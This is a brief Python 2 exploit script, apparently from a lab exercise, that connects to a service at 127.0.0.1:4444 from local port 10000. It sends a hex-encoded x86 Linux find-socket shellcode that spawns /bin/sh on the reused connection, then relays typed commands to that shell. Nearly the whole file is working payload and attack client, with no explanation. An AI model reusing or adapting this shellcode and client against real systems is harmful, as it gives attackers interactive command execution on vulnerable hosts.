import socket

def client_sender(buffer):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     
        try:                # connect to our target host
                client.bind(('0.0.0.0', 10000))
                client.connect(("127.0.0.1",4444))
                if len(buffer):
                        client.send(buffer)
                        while True:                        # now wait for data back
                                recv_len = 1
                                response = ""
                                while recv_len:
                                        buffer = raw_input("")         
                                        buffer += "\n"                        # send it off
                                        client.send(buffer)
                                        data     = client.recv(4096)
                                        print data                     
        except:
                print "[*] Exception! Exiting."                # tear down the connection
        client.close()

if __name__ == "__main__":
        buffer =  ""
        buffer += "\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1"
        buffer += "\xb3\x07\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f"
        buffer += "\x02\x27\x10\x75\xf1\x5b\x6a\x02\x59\xb0\x3f\xcd"
        buffer += "\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        buffer += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
        buffer += "\xcd\x80\n"
        client_sender(buffer)
